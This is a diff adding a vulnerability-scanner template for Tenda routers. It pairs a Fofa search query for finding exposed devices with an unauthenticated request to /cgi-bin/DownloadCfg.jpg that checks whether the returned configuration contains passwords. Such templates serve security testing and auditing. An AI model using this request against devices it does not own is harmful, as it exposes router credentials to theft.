@@ -1,0 +1,19 @@
+id: tenda-downloadcfg-leak
+
+info:
+  name: Tenda 敏感信息泄露
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: app="Tenda-路由器"
+  tags: tenda,route,leak
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/DownloadCfg.jpg
+    expression: response.status == 200 && response.body.bcontains(b'passwd')
+expression: r0()
